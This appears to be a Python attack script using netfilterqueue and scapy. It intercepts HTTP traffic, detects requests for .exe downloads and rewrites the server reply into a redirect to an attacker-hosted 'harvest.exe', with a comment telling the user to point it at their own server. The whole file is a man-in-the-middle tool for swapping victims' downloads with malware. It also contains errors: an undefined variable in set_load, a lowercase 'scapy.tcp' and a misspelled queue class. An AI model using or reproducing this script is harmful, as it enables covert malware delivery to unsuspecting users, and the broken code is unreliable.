#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

ack_list = []


def set_load(packet, load):
    http_packet[scapy.Raw].load = load
    del http_packet[scapy.IP].len
    del http_packet[scapy.IP].chksum
    del http_packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    http_packet = scapy.IP(packet.get_payload())
    if http_packet.haslayer(scapy.Raw):
        if http_packet[scapy.TCP].dport == 8080:
            ack_list.append(http_packet[scapy.tcp].ack)
            if b".exe" in http_packet[scapy.Raw].load and b"192.168.x.y" not in http_packet[scapy.Raw].load:
                print("[+] .exe Request file requested")

        elif http_packet[scapy.TCP].sport == 8080:
            if http_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(http_packet[scapy.TCP].seq)
                print("[+] Replacing download file...")
                modified_packet = set_load(http_packet, "HTTP/1.1 301 Moved Permanently\nLocation: "
                                                        "https://192.168.x.y/havesters/harvest.exe\n ")
                #  replace the destination link/location with your own(could point to a file in your own pc's server)

                packet.set_payload(bytes(modified_packet))

    packet.accept()


queue = netfilterqueue.NetfiletrQueue()
queue.bind(0, process_packet)
queue.run()
